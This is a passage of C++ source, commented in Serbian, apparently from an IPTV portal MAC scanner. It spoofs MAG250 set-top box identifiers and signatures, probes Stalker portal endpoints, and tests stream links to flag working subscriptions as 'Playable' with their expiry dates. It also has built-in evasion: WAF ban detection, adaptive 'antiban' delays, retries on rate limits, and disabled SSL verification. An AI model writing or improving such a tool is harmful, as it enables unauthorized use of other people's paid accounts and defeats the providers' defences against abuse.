            if (!handshakeOk || token.isEmpty()) {
            // Samo pravi ban (403/waf) povećava fail counter.
            // 503 = CF/nginx privremeni overload — ne brojiš kao IP ban.
            if (wafBanDetected) {
                dbg("HANDSHAKE", "CF BAN → skip");
            } else {
                // Ne zovi recordHandshakeFail — 503 overload nije naša greška
                dbg("HANDSHAKE", "FAIL");
            }
            return false;
        }
        recordHandshakeOk(serverKey);
            dbg("HANDSHAKE", "OK token=" + token.left(8));
        }

        // ── Odredi bazni delay za ovaj portal (na osnovu reactive stanja) ──
        auto getAdaptiveDelay = [&](int baseMs) -> int {
            auto* rt = getReactThrottle(serverKey);
            std::lock_guard<std::mutex> lk(rt->mx);
            if (rt->isAggressive) return qMax(baseMs, rt->delayMs);
            return qMax(rt->minDelayMs, baseMs / 3); // Brži za normalne portale
        };

        if (m_stopRequested.load()) return false;
        auto makeActionUrl = [&](const QString &params) -> QString {
            if (m_useServerLoad)
                return apiBase + "server/load.php?" + params;
            return apiBase + "portal.php?" + params;
        };
    qDebug() << "[ACTION_URL_MODE]" << macUpper
                 << "m_useServerLoad=" << m_useServerLoad
                 << "apiBase=" << apiBase;

        {
            int d = getAdaptiveDelay(150);
            if (d > 0 && !m_stopRequested.load())
                std::this_thread::sleep_for(std::chrono::milliseconds(d));
        }
        // ═══ KORAK 2: get_profile — brza validacija MAC-a ═══
        {
            QString verEnc = "ImageDescription%3A%200.2.18-r23-250%3B%20"
                "ImageDate%3A%20Wed%20Aug%2029%2010%3A49%3A53%20EEST%202018%3B%20"
                "PORTAL%20version%3A%205.3.1%3B%20API%20Version%3A%20JS%20API%20"
                "version%3A%20343%3B%20STB%20API%20version%3A%20146%3B%20"
                "Player%20Engine%20version%3A%200x58c";
            QString metricsJson = QString(R"({"mac":"%1","sn":"%2","type":"STB","model":"MAG250","uid":"%3","random":""})")
                .arg(macUpper, sn, deviceId);
            QString metricsEnc = QString::fromUtf8(QUrl::toPercentEncoding(metricsJson));
            QString url = makeActionUrl(
                "type=stb&action=get_profile&hd=1&ver=" + verEnc +
                "&num_banks=2&sn=" + sn + "&stb_type=MAG250&client_type=STB"
                "&image_version=218&video_out=hdmi&device_id=" + deviceId +
                "&device_id2=" + deviceId + "&signature=" + signature +
                "&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0"
                "&metrics=" + metricsEnc +
                "&hw_version_2=3c7ae5b19d3c84544afd34f190d0b1fbd988cc02"
                "&api_signature=262&prehash=&JsHttpRequest=1-xml");
            try {
                cpr::Response r = cpr::Get(
                    cpr::Url{url.toStdString()},
                    cpr::Timeout{m_stopRequested.load() ? 200 : 6000},
                    cpr::VerifySsl{false}, makeHeaders(token));
                qDebug() << "[GET_PROFILE HTTP]" << macUpper
                         << "status:" << r.status_code
                         << "body[:300]:" << QString::fromStdString(r.text).left(300);
                if (m_stopRequested.load()) { return false; }
                if (r.text.empty()) { return false; }

                // ── Stb mismatch (403) = MAC je registrovan, samo device params ne odgovaraju ──
                bool stbMismatch = false;
                if (r.status_code == 403) {
                    std::string bodyLow = r.text;
                    std::transform(bodyLow.begin(), bodyLow.end(), bodyLow.begin(), ::tolower);
                    if (bodyLow.find("stb")        != std::string::npos ||
                        bodyLow.find("mismatch")   != std::string::npos ||
                        bodyLow.find("missmatch")  != std::string::npos ||
                        bodyLow.find("validation") != std::string::npos) {
                        qDebug() << "[GET_PROFILE] 403 Stb mismatch → MAC registrovan, nastavljamo";
                        stbMismatch = true;
                    } else {
                        qDebug() << "[GET_PROFILE] 403 nepoznat → return false";
                        return false;
                    }
                    } else if (r.status_code == 429) {
                    reactiveReport(serverKey, 429);
                    qDebug() << "[GET_PROFILE] 429 Too Many → čekam 8s i ponavljam";
                    for (int _w = 0; _w < 16 && !m_stopRequested.load(); _w++)
                        std::this_thread::sleep_for(std::chrono::milliseconds(500));
                    if (m_stopRequested.load()) return false;
                    // Retry 1
                    {
                        cpr::Response r2 = cpr::Get(
                            cpr::Url{url.toStdString()},
                            cpr::Timeout{m_stopRequested.load() ? 200 : 8000},
                            cpr::VerifySsl{false}, makeHeaders(token));
                        qDebug() << "[GET_PROFILE RETRY]" << macUpper
                                 << "status:" << r2.status_code
                                 << "body[:200]:" << QString::fromStdString(r2.text).left(200);
                        if (r2.status_code == 200) {
                            qDebug() << "[GET_PROFILE RETRY] OK → nastavljamo";
                            // nastavljamo normalnim tokom
                        } else if (r2.status_code == 429) {
                            // Retry 2 — čekaj još 12s
                            qDebug() << "[GET_PROFILE RETRY2] još 429 → čekam 12s";
                            for (int _w2 = 0; _w2 < 24 && !m_stopRequested.load(); _w2++)
                                std::this_thread::sleep_for(std::chrono::milliseconds(500));
                            if (m_stopRequested.load()) return false;
                            cpr::Response r3 = cpr::Get(
                                cpr::Url{url.toStdString()},
                                cpr::Timeout{m_stopRequested.load() ? 200 : 10000},
                                cpr::VerifySsl{false}, makeHeaders(token));
                            qDebug() << "[GET_PROFILE RETRY3]" << macUpper
                                     << "status:" << r3.status_code
                                     << "body[:200]:" << QString::fromStdString(r3.text).left(200);
                            if (r3.status_code != 200) {
                                qDebug() << "[GET_PROFILE RETRY3] i dalje fail → return false";
                                return false;
                            }
                            qDebug() << "[GET_PROFILE RETRY3] OK → nastavljamo";
                        } else {
                            qDebug() << "[GET_PROFILE RETRY] fail status=" << r2.status_code << "→ return false";
                            return false;
                        }
                    }

if (!stbMismatch) {
                    json j;
                    try {
                        j = json::parse(r.text);
                    } catch (...) {
                        qDebug() << "[GET_PROFILE PARSE FAIL]" << macUpper
                                 << "body:" << QString::fromStdString(r.text).left(300);
                        return false;
                    }
                    qDebug() << "[GET_PROFILE JSON]" << macUpper
                             << "body[:400]:" << QString::fromStdString(r.text).left(400);
                    if (!j.contains("js") || !j["js"].is_object()) {
                        qDebug() << "[GET_PROFILE] No js object → return false";
                        return false;
                    }
                    auto js = j["js"];

                    // ── Detekcija "device_id mismatch" u js.msg ──
                    // Ovo znači MAC postoji ali device parametri ne odgovaraju.
                    // Sa novim MD5/SHA256 algoritmom to ne bi smelo da se desi.
                    // Ako se i dalje desi, logujemo ali NE odustajemo — MAC može biti validan.
                    bool deviceMismatch = false;
                    try {
                        if (js.contains("msg") && js["msg"].is_string()) {
                            std::string msg = js["msg"].get<std::string>();
                            std::string msgLow = msg;
                            std::transform(msgLow.begin(), msgLow.end(), msgLow.begin(), ::tolower);
                            if (msgLow.find("mismatch") != std::string::npos ||
                                msgLow.find("conflict")  != std::string::npos) {
                                deviceMismatch = true;
                                qDebug() << "[GET_PROFILE] device_id mismatch detektovan za" << macUpper
                                         << "— nastavljamo (MAC može biti validan)";
                            }
                        }
                    } catch (...) {}

                    std::string profileIp = "";
                    try {
                        if (js.contains("ip") && !js["ip"].is_null() && js["ip"].is_string())
                            profileIp = js["ip"].get<std::string>();
                    } catch (...) {}

                    bool idIsNull = false;
                    try {
                        idIsNull = !js.contains("id") || js["id"].is_null() ||
                            (js["id"].is_number_integer() && js["id"].get<int>() == 0) ||
                            (js["id"].is_string() && js["id"].get<std::string>() == "0");
                    } catch (...) { idIsNull = true; }

                    bool macEmpty = false;
                    try {
                        macEmpty = js.contains("mac") && js["mac"].is_string() &&
                                   js["mac"].get<std::string>().empty();
                    } catch (...) {}

                    bool macIsBase64 = false;
                    try {
                        macIsBase64 = js.contains("mac") && js["mac"].is_string() &&
                                      js["mac"].get<std::string>().find('=') != std::string::npos;
                    } catch (...) {}

                    bool effectiveMacEmpty = macEmpty && !macIsBase64;

                    static const std::vector<std::string> demoIps = {"31.171.155.10", "0.0.0.0"};
                    bool isDemoIp = !profileIp.empty() &&
                                    std::any_of(demoIps.begin(), demoIps.end(),
                                        [&](const std::string &d){ return profileIp == d; });

                    // Demo MAC: samo odbaci ako i IP je demo I id je null I NEMA device mismatch
                    // (device mismatch = MAC postoji, nije demo)
                    if (!deviceMismatch && (idIsNull || effectiveMacEmpty) && isDemoIp) {
                        dbg("GET_PROFILE", "Demo MAC → skip");
                        return false;
                    }

                    bool blockedMac = false;
                    try {
                        if (js.contains("blocked") && !js["blocked"].is_null()) {
                            std::string s;
                            if (js["blocked"].is_string()) s = js["blocked"].get<std::string>();
                            else if (js["blocked"].is_number_integer())
                                s = std::to_string(js["blocked"].get<int>());
                            if (s == "1") blockedMac = true;
                        }
                    } catch (...) {}
                    qDebug() << "[GET_PROFILE CHECK]" << macUpper
                             << "idIsNull=" << idIsNull
                             << "effectiveMacEmpty=" << effectiveMacEmpty
                             << "isDemoIp=" << isDemoIp
                             << "profileIp=" << QString::fromStdString(profileIp)
                             << "deviceMismatch=" << deviceMismatch
                             << "blockedMac=" << blockedMac;
                    if (blockedMac) { dbg("GET_PROFILE", "Blokiran"); return false; }
                }

            } // zatvara if (!stbMismatch)
            } catch (...) { return false; }
        } // zatvara get_profile {} blok

    if (m_stopRequested.load()) return false;

        {
            int d = getAdaptiveDelay(100);
            if (d > 0 && !m_stopRequested.load())
                std::this_thread::sleep_for(std::chrono::milliseconds(d));
        }
        // ═══ KORAK 3: get_main_info
        QString expireDate = "Unlimited";
        int maxConn = 0;
        {
            QString url = makeActionUrl("type=account_info&action=get_main_info&JsHttpRequest=1-xml");
            try {
                cpr::Response r = cpr::Get(
                    cpr::Url{url.toStdString()},
cpr::Timeout{m_stopRequested.load() ? 200 : 5000},
                    cpr::VerifySsl{false}, makeHeaders(token));
                qDebug() << "[MAIN_INFO]" << macUpper << "status:" << r.status_code
                         << "body:" << QString::fromStdString(r.text).left(300);
                if (r.status_code == 200 && !r.text.empty()) {
                    auto j = json::parse(r.text);
                    if (j.contains("js") && j["js"].is_object()) {
                        auto js = j["js"];
                        if (js.contains("phone") && js["phone"].is_string()) {
                            std::string ph = js["phone"].get<std::string>();
                            if (!ph.empty() && ph != "0" && ph.find("1970") == std::string::npos) {
                                QString full = QString::fromStdString(ph);
                                QRegularExpression reTime(R"(,\s*\d+:\d+\s*(am|pm))",
                                    QRegularExpression::CaseInsensitiveOption);
                                full.remove(reTime); full = full.trimmed();
                                QDate d = QDate::fromString(full, "MMMM d, yyyy");
                                expireDate = d.isValid() ? d.toString("dd.MM.yyyy") : full;
                            }
                        }
                        for (const char *f : {"max_connections", "con_limit", "connections"}) {
                            if (js.contains(f) && !js[f].is_null()) {
                                try {
                                    maxConn = js[f].is_string()
                                        ? std::stoi(js[f].get<std::string>())
                                        : js[f].get<int>();
                                } catch (...) {}
                                break;
                            }
                        }
                    }
                }
            } catch (...) {}
        }
dbg("EXPIRY", expireDate + " maxConn=" + QString::number(maxConn));

        if (m_stopRequested.load()) return false;

        {
            int d = getAdaptiveDelay(80);
            if (d > 0 && !m_stopRequested.load())
                std::this_thread::sleep_for(std::chrono::milliseconds(d));
        }
        // ═══ KORAK 4: Prikupi channel CMD-ove
        QList<QString> channelCmds;

// Pokušaj 1: get_all_channels
        {
            QString url = makeActionUrl("type=itv&action=get_all_channels&JsHttpRequest=1-xml");
            qDebug() << "[CHANNELS_URL]" << macUpper << "get_all_channels URL:" << url;
            try {
                cpr::Response r = cpr::Get(
                    cpr::Url{url.toStdString()},
cpr::Timeout{m_stopRequested.load() ? 200 : 6000},
                    cpr::VerifySsl{false}, makeHeaders(token));
                qDebug() << "[GET_ALL_CHANNELS]" << macUpper
                         << "status:" << r.status_code
                         << "body[:300]:" << QString::fromStdString(r.text).left(300);
                if (r.status_code == 200 && !r.text.empty()) {
                    auto j = json::parse(r.text);
                    qDebug() << "[CHANNELS_JSON]" << macUpper
                             << "has_js:" << j.contains("js")
                             << "js_is_obj:" << (j.contains("js") ? j["js"].is_object() : false)
                             << "has_data:" << (j.contains("js") && j["js"].is_object() ? j["js"].contains("data") : false);
                    if (j.contains("js") && j["js"].is_object() &&
                        j["js"].contains("data") && j["js"]["data"].is_array()) {
    for (auto &ch : j["js"]["data"]) {
                        if (ch.contains("cmd") && ch["cmd"].is_string()) {
                            std::string cmd = ch["cmd"].get<std::string>();
                            if (!cmd.empty() &&
                                cmd.find("videezy.com") == std::string::npos &&
                                cmd.find("static.vid")  == std::string::npos) {
                                QString qcmd = QString::fromStdString(cmd);
                                QRegularExpression reStream(R"([&?]stream=(\d+))");
                                QRegularExpression rePath(R"(/(\d+)\.(ts|m3u8|mp4)$)");
                                auto m1 = reStream.match(qcmd);
                                auto m2 = rePath.match(qcmd);
                                QString streamId;
                                if (m1.hasMatch() && !m1.captured(1).isEmpty() && m1.captured(1) != "0")
                                    streamId = m1.captured(1);
                                else if (m2.hasMatch())
                                    streamId = m2.captured(1);
                                if (!streamId.isEmpty())
                                    channelCmds.append(streamId + "|" + qcmd);
                                else
                                    channelCmds.append(qcmd);
                            }
                            if (channelCmds.size() >= 20) break;
                        }
                    }
                    }
                }
            } catch (...) {}
        }

// Pokušaj 2: get_ordered_list (ako get_all_channels nije vratio ništa)
        if (channelCmds.isEmpty() && !m_stopRequested.load()) {
            int firstGenreId = -1;
            {
                QString url = makeActionUrl("type=itv&action=get_genres&JsHttpRequest=1-xml");
                qDebug() << "[GENRES_URL]" << macUpper << "get_genres URL:" << url;
                try {
                    cpr::Response r = cpr::Get(
                        cpr::Url{url.toStdString()},
    cpr::Timeout{m_stopRequested.load() ? 200 : 5000},
                    cpr::VerifySsl{false}, makeHeaders(token));
                    qDebug() << "[GET_GENRES]" << macUpper
                             << "status:" << r.status_code
                             << "body[:300]:" << QString::fromStdString(r.text).left(300);
                    if (r.status_code == 200 && !r.text.empty()) {
                        auto j = json::parse(r.text);
                        json arr;
                        if (j.contains("js") && j["js"].is_array()) arr = j["js"];
                        else if (j.contains("js") && j["js"].is_object() &&
                                 j["js"].contains("data") && j["js"]["data"].is_array())
                            arr = j["js"]["data"];
                        for (auto &g : arr) {
                            if (g.contains("id") && !g["id"].is_null()) {
                                try {
                                    int gid = g["id"].is_string()
                                        ? std::stoi(g["id"].get<std::string>())
                                        : g["id"].get<int>();
                                    if (gid > 0) { firstGenreId = gid; break; }
                                } catch (...) {}
                            }
                        }
                    }
                } catch (...) {}
            }
            if (firstGenreId > 0 && !m_stopRequested.load()) {
                for (int pg = 1; pg <= 5 && channelCmds.size() < 15 && !m_stopRequested.load(); ++pg) {
QString url = makeActionUrl(
                        QString("type=itv&action=get_ordered_list"
                                "&genre=%1&force_ch_link_check=&fav=0"
                                "&sortby=number&hd=0&p=%2&JsHttpRequest=1-xml")
                        .arg(firstGenreId).arg(pg));
                    try {
                        cpr::Response r = cpr::Get(
                            cpr::Url{url.toStdString()},
cpr::Timeout{m_stopRequested.load() ? 200 : 5000},
                        cpr::VerifySsl{false}, makeHeaders(token));
                        if (r.status_code == 200 && !r.text.empty()) {
                            auto j = json::parse(r.text);
                            if (j.contains("js") && j["js"].is_object() &&
                                j["js"].contains("data") && j["js"]["data"].is_array()) {
                                for (auto &ch : j["js"]["data"]) {
if (ch.contains("cmd") && ch["cmd"].is_string()) {
                                        std::string cmd = ch["cmd"].get<std::string>();
                                        if (!cmd.empty() &&
                                            cmd.find("videezy.com") == std::string::npos &&
                                            cmd.find("static.vid")  == std::string::npos) {
                                            QString qcmd = QString::fromStdString(cmd);
                                            QRegularExpression reStream(R"([&?]stream=(\d+))");
                                            QRegularExpression rePath(R"(/(\d+)\.(ts|m3u8|mp4)$)");
                                            auto m1 = reStream.match(qcmd);
                                            auto m2 = rePath.match(qcmd);
                                            QString streamId;
                                            if (m1.hasMatch() && !m1.captured(1).isEmpty() && m1.captured(1) != "0")
                                                streamId = m1.captured(1);
                                            else if (m2.hasMatch())
                                                streamId = m2.captured(1);
                                            if (!streamId.isEmpty())
                                                channelCmds.append(streamId + "|" + qcmd);
                                            else
                                                channelCmds.append(qcmd);
                                        }
                                        if (channelCmds.size() >= 20) break;
                                    }
                                }
                            }
                        }
                    } catch (...) {}
                }
            }
        }

        if (channelCmds.isEmpty()) {
            dbg("CHANNELS", "Nema CMD-ova → nije playable");
            return false;
        }
        dbg("CHANNELS", QString("Prikupljeno %1 CMD-ova").arg(channelCmds.size()));

        // ── Sačuvaj raw CMD URL-ove za direktni fallback (kada create_link vrati link_fault) ──
        QList<QString> rawCmdUrls;
        for (const QString &entry : channelCmds) {
            int pipePos = entry.indexOf('|');
            QString cmd = (pipePos > 0) ? entry.mid(pipePos + 1) : entry;
            // Izvuci http URL iz cmd-a
            if (cmd.startsWith("http")) {
                rawCmdUrls.append(cmd);
            } else {
                // ffmpeg format: "ffmpeg http://..."
                QStringList parts = cmd.split(' ', Qt::SkipEmptyParts);
                for (const QString &p : parts)
                    if (p.startsWith("http")) { rawCmdUrls.append(p); break; }
            }
            if (rawCmdUrls.size() >= 3) break;
        }

        if (m_stopRequested.load()) return false;

// ═══ KORAK 5: create_link → testStreamUrl ═══
        // Jedini kriterijum: stream vraća realne media bajtove.
        // Čim JEDAN kanal prođe → playable!

        auto fillResult = [&]() {
            out.isValid = true;
            out.maxConn = maxConn;
            out.portal  = portal;
            out.mac     = macUpper;
            QString connStr = maxConn > 0 ? QString("Max: %1").arg(maxConn) : "Max: -";
            out.content = QString(
                "Portal: %1\nMAC: %2\n"
                "Vreme: %3  Istice: %4  %5  ✅ Playable\n%6\n"
            ).arg(portal, macUpper,
                  QDateTime::currentDateTime().toString("dd.MM.yyyy HH:mm"),
                  expireDate, connStr, QString("─").repeated(100));
        };

        QString referer = portalUrl.scheme() + "://" + portalHost +
                          (portalPort != 80 ? ":" + QString::number(portalPort) : "") + "/c/";

        int maxToTest           = qMin(channelCmds.size(), 5);
        int streamFailCount      = 0;
        int stream456Count       = 0;
        int stream458Count       = 0;
        int streamHardFailCount  = 0;
        int streamLinkFaultCount = 0; // link_fault = stream nedostupan, MAC registrovan ali ne playable

            for (int i = 0; i < maxToTest && !m_stopRequested.load(); ++i) {
            antibanSleep(80, 200);
            QString rawEntry = channelCmds[i];
            // Razdvoji streamId od CMD-a (format "ID|CMD")
            QString streamId;
            QString cmd;
            int pipePos = rawEntry.indexOf('|');
            if (pipePos > 0) {
                streamId = rawEntry.left(pipePos);
                cmd      = rawEntry.mid(pipePos + 1);
            } else {
                cmd = rawEntry;
            }

            QString cmdEncoded = QString::fromUtf8(QUrl::toPercentEncoding(cmd));
QString createUrl  = makeActionUrl(
                "type=itv&action=create_link"
                "&forced_storage=undefined&download=0"
                "&cmd=" + cmdEncoded + "&JsHttpRequest=1-xml");

            QString realUrl;

            try {
                cpr::Response r = cpr::Get(
                    cpr::Url{createUrl.toStdString()},
                    cpr::Timeout{m_stopRequested.load() ? 200 : 6000},
                    cpr::VerifySsl{false}, makeHeaders(token));

                qDebug() << "[MAC]" << macUpper
                         << "create_link [" << i+1 << "/" << maxToTest << "]"
                         << "status:" << r.status_code
                         << "body:" << QString::fromStdString(r.text).left(200);

                if (r.status_code != 200 || r.text.empty()) { streamFailCount++; continue; }
                auto j = json::parse(r.text);
                if (!j.contains("js")) { streamFailCount++; continue; }
                if (!j["js"].is_object()) {
    qDebug() << "[CREATE_LINK] js nije objekat []:"
             << QString::fromStdString(r.text).left(80);
    // Svaki non-object js (prazan niz, null, itd) = link_fault
    ++streamLinkFaultCount;
    streamFailCount++;
    continue;
}
                auto js = j["js"];

                if (js.contains("error") && js["error"].is_string() &&
                    !js["error"].get<std::string>().empty()) {
                    std::string errStr = js["error"].get<std::string>();
                    qDebug() << "[MAC] create_link error:"
                             << QString::fromStdString(errStr);
                    streamFailCount++;
                    if (errStr == "link_fault")
                        ++streamLinkFaultCount; // trajni fail stream-a, ne prolazni
                    continue;
                }

if (js.contains("cmd") && js["cmd"].is_string())
                    realUrl = QString::fromStdString(js["cmd"].get<std::string>());

                // Skini "ffmpeg" prefix — uzmi poslednji http token
                if (realUrl.startsWith("ffmpeg ")) {
                    QStringList parts = realUrl.split(' ', Qt::SkipEmptyParts);
                    for (const QString &p : parts)
                        if (p.startsWith("http")) { realUrl = p; break; }
                }

// Fix duplikovani path koji server vraća u create_link cmd-u
                // Pattern: "http://host:port/user/pass/SUFFIX/user/pass/id?token"
                // gdje SUFFIX sadrži deo hostname-a (npr "ntar.org:80" umesto "datacentar.org:80")
                // Detektujemo: username se pojavljuje DVA PUTA u putanji
                {
                    // Izvuci username i password iz originalnog cmd-a (iz get_all_channels)
                    // Username je deo između prvog i drugog "/" posle porta
                    // Npr: http://host:80/USERNAME/PASSWORD/id
                    // Tražimo pattern /USERNAME/PASSWORD/ koji se ponavlja
                    QRegularExpression reDoubleUser(
                        R"(^(https?://[^/]+/([^/]+)/([^/]+)/).*\2/\3/(\d+)(\?.*)?$)"
                    );
                    auto m = reDoubleUser.match(realUrl);
                    if (m.hasMatch()) {
                        QString baseAndUser = m.captured(1); // "http://host/user/pass/"
                        QString id          = m.captured(4); // "31920"
                        QString queryPart   = m.captured(5); // "?play_token=..."
                        QString fixedUrl    = baseAndUser + id + queryPart;
                        qDebug() << "[URL FIX duplikat regex]" << macUpper
                                 << "\n  was:" << realUrl.left(120)
                                 << "\n  now:" << fixedUrl.left(120);
                        realUrl = fixedUrl;
                    }
                }

                // Fix localhost/127.0.0.1
                if (realUrl.contains("localhost") || realUrl.contains("127.0.0.1")) {
                    QString repl = portalHost + ":" + QString::number(portalPort);
                    realUrl.replace("localhost", repl);
                    realUrl.replace("127.0.0.1", repl);
                }

                // ── KRITIČAN FIX: popuni prazan stream= parametar ──
                // Ako URL ima &stream= ili ?stream= bez vrednosti, ubaci streamId
                if (!streamId.isEmpty() && realUrl.contains("stream=")) {
                    QRegularExpression reEmptyStream(R"([&?]stream=(?=&|$))");
                    if (reEmptyStream.match(realUrl).hasMatch()) {
                        realUrl.replace(QRegularExpression(R"(stream=(?=&|$))"),
                                        "stream=" + streamId);
                        qDebug() << "[MAC] Fixed stream ID:" << streamId
                                 << "→" << realUrl.left(100);
                    }
                }

                if (realUrl.isEmpty() || !realUrl.startsWith("http")) {
    streamFailCount++;   // ← create_link fail = stream fail
    continue;
}

            } catch (...) { continue; }

            if (m_stopRequested.load()) return false;

cpr::Header streamHeaders = makeHeaders(token);
            streamHeaders["Referer"] = referer.toStdString();

            int lastStreamStatus = 0;
            bool streamOk = false;
            try {
                std::string body;
                bool stoppedEarly = false;
                cpr::Response rs = cpr::Get(
                    cpr::Url{realUrl.toStdString()},
cpr::Timeout{m_stopRequested.load() ? 200 : 8000},
                    cpr::VerifySsl{false},
                    streamHeaders,
                    cpr::WriteCallback{[&](const std::string_view d, intptr_t) -> bool {
                        body.append(d.data(), d.size());
                        if (body.size() >= 4096) { stoppedEarly = true; return false; }
                        return true;
                    }}
                );
                lastStreamStatus = rs.status_code;
                if (stoppedEarly && lastStreamStatus == 0) lastStreamStatus = 200;

                qDebug() << "[STREAM2]" << macUpper << "kanal" << i+1
                         << "status=" << lastStreamStatus << "bytes=" << body.size();

                if (lastStreamStatus == 200 || lastStreamStatus == 206 || stoppedEarly) {
                    std::string ct = rs.header.count("Content-Type") ? rs.header.at("Content-Type") : "";
                    std::transform(ct.begin(), ct.end(), ct.begin(), ::tolower);
                    if (ct.find("text/html") == std::string::npos &&
                        ct.find("application/json") == std::string::npos &&
                        body.size() >= 64) {
                        streamOk = true;
                    }
                }
            } catch (...) {}

            if (streamOk) {
                fillResult();
                dbg("STREAM", QString("✅ PLAYABLE kanal %1/%2 url=%3")
                    .arg(i+1).arg(maxToTest).arg(realUrl.left(80)));
                return true;
            }

            streamFailCount++;
            if (lastStreamStatus == 456) stream456Count++;
            else if (lastStreamStatus == 458) stream458Count++;
            else if (lastStreamStatus == 401 || lastStreamStatus == 403)
    streamHardFailCount++;
        }

        // Fallback PLAYABLE: sve greške su 404/503 (privremeni server problem) → MAC registrovan
        if (streamFailCount > 0 && streamFailCount == maxToTest &&
            stream456Count == 0 && stream458Count == 0 &&
            streamHardFailCount == 0 &&
            streamLinkFaultCount < maxToTest) {
            fillResult();
            dbg("STREAM", "✅ PLAYABLE — svi streamovi 404/503 ali MAC registrovan");
            return true;
        }

        // ── DIREKTNI CDN FALLBACK: svi create_link su link_fault ali MAC je aktivan ──
        // Probaj raw CMD URL-ove direktno (server ih je dao u get_all_channels)
        if (streamLinkFaultCount > 0 && !rawCmdUrls.isEmpty() &&
            !m_stopRequested.load(std::memory_order_acquire)) {
            dbg("STREAM", QString("create_link link_fault — probam %1 direktnih CDN URL-ova")
                .arg(rawCmdUrls.size()));
            for (const QString &rawUrl : rawCmdUrls) {
                if (m_stopRequested.load(std::memory_order_acquire)) break;
                if (rawUrl.isEmpty() || !rawUrl.startsWith("http")) continue;
                qDebug() << "[CDN DIRECT]" << macUpper << "url=" << rawUrl.left(100);
                // Gradi headere specifične za CDN host (ne portal host)
                QString cdnBase = extractBaseUrlSafe(rawUrl);
                QString cdnHostFull = cdnBase;
                cdnHostFull.replace("http://", "").replace("https://", "");
                cpr::Header streamHeaders;
                streamHeaders["User-Agent"] = sessionUa;
                streamHeaders["Accept"]     = "*/*";
                streamHeaders["Connection"] = "keep-alive";
                streamHeaders["Host"]       = cdnHostFull.toStdString();
                streamHeaders["Referer"]    = referer.toStdString();
                try {
                    std::string body; bool stoppedEarly = false;
                    cpr::Response rs = cpr::Get(
                        cpr::Url{rawUrl.toStdString()},
                        cpr::Timeout{m_stopRequested.load() ? 200 : 8000},
                        cpr::VerifySsl{false},
                        streamHeaders,
                        cpr::WriteCallback{[&](const std::string_view d, intptr_t) -> bool {
                            body.append(d.data(), d.size());
                            if (body.size() >= 4096) { stoppedEarly = true; return false; }
                            return true;
                        }}
                    );
                    int status = rs.status_code;
                    if (stoppedEarly && status == 0) status = 200;
                    qDebug() << "[CDN DIRECT]" << macUpper
                             << "status=" << status << "bytes=" << body.size();
if (status == 200 || status == 206 || stoppedEarly) {
                        std::string ct = rs.header.count("Content-Type")
                            ? rs.header.at("Content-Type") : "";
                        std::transform(ct.begin(), ct.end(), ct.begin(), ::tolower);
                        bool isHtml = ct.find("text/html") != std::string::npos;
                        bool isJson = ct.find("application/json") != std::string::npos;
                        bool hasData = body.size() >= 32;
                        // M3U8 playlist — najvažniji slučaj za ovaj CDN
                        bool isM3u8 = (body.size() >= 7 && body.substr(0, 7) == "#EXTM3U") ||
                                      (body.size() >= 7 && body.find("#EXTM3U") != std::string::npos) ||
                                      ct.find("mpegurl") != std::string::npos ||
                                      ct.find("m3u") != std::string::npos;
                        qDebug() << "[CDN DIRECT CHECK]" << macUpper
                                 << "isHtml=" << isHtml << "isJson=" << isJson
                                 << "hasData=" << hasData << "isM3u8=" << isM3u8
                                 << "ct=" << QString::fromStdString(ct)
                                 << "body[:50]=" << QString::fromStdString(body.substr(0, qMin(body.size(), (size_t)50)));
                if (!isHtml && !isJson && hasData && (isM3u8 || body.size() >= 64)) {
                            fillResult();
                            dbg("STREAM", QString("✅ PLAYABLE — CDN direktan URL radi: %1")
                                .arg(rawUrl.left(80)));
                            return true;
                        }
                    }
                } catch (...) {}

                // ── HTTPS fallback za CDN URL ──
                if (!m_stopRequested.load(std::memory_order_acquire) && rawUrl.startsWith("http://")) {
                    QString httpsUrl = rawUrl;
                    httpsUrl.replace(0, 7, "https://");
                    qDebug() << "[CDN DIRECT HTTPS]" << macUpper << "url=" << httpsUrl.left(100);
                    try {
                        std::string body2; bool stoppedEarly2 = false;
                        cpr::Response rs2 = cpr::Get(
                            cpr::Url{httpsUrl.toStdString()},
                            cpr::Timeout{m_stopRequested.load() ? 200 : 8000},
                            cpr::VerifySsl{false},
                            streamHeaders,
                            cpr::WriteCallback{[&](const std::string_view d, intptr_t) -> bool {
                                body2.append(d.data(), d.size());
                                if (body2.size() >= 4096) { stoppedEarly2 = true; return false; }
                                return true;
                            }}
                        );
                        int status2 = rs2.status_code;
                        if (stoppedEarly2 && status2 == 0) status2 = 200;
                        qDebug() << "[CDN DIRECT HTTPS]" << macUpper
                                 << "status=" << status2 << "bytes=" << body2.size();
                        if (status2 == 200 || status2 == 206 || stoppedEarly2) {
                            std::string ct2 = rs2.header.count("Content-Type")
                                ? rs2.header.at("Content-Type") : "";
                            std::transform(ct2.begin(), ct2.end(), ct2.begin(), ::tolower);
                            bool isHtml2 = ct2.find("text/html") != std::string::npos;
                            bool isJson2 = ct2.find("application/json") != std::string::npos;
                            bool hasData2 = body2.size() >= 32;
                            bool isM3u82 = (body2.size() >= 7 && body2.substr(0, 7) == "#EXTM3U") ||
                                           body2.find("#EXTM3U") != std::string::npos ||
                                           ct2.find("mpegurl") != std::string::npos ||
                                           ct2.find("m3u") != std::string::npos;
                            qDebug() << "[CDN DIRECT HTTPS CHECK]" << macUpper
                                     << "isHtml=" << isHtml2 << "isM3u8=" << isM3u82
                                     << "bytes=" << body2.size()
                                     << "ct=" << QString::fromStdString(ct2).left(50);
                            if (!isHtml2 && !isJson2 && hasData2 && (isM3u82 || body2.size() >= 64)) {
                                fillResult();
                                dbg("STREAM", QString("✅ PLAYABLE — CDN HTTPS direktan URL radi: %1")
                                    .arg(httpsUrl.left(80)));
                                return true;
                            }
                        }
                    } catch (...) {}
                }
            }
            dbg("STREAM", "CDN direktni URL-ovi ne rade — nije playable");
        }

// ── POSLEDNJI FALLBACK: svi link_fault + MAC ima kanale + end_date u budućnosti ──
        // link_fault = serverski bug u create_link, ne znači da MAC nije validan.
        // Ako je MAC imao kanale (get_all_channels vratio podatke) i expiry nije prošao,
        // tretiraj kao playable — korisnik može da ga otvori u playeru direktno.
        if (streamLinkFaultCount == maxToTest && !channelCmds.isEmpty()) {
            // Proveri da li je expiry u budućnosti (ili Unlimited)
            bool expiryOk = (expireDate == "Unlimited");
            if (!expiryOk) {
                QDate expD = QDate::fromString(expireDate, "dd.MM.yyyy");
                expiryOk = expD.isValid() && expD >= QDate::currentDate();
            }
            if (expiryOk) {
                fillResult();
                dbg("STREAM", "✅ PLAYABLE — link_fault je serverski bug, MAC ima kanale i aktivan je");
                return true;
            }
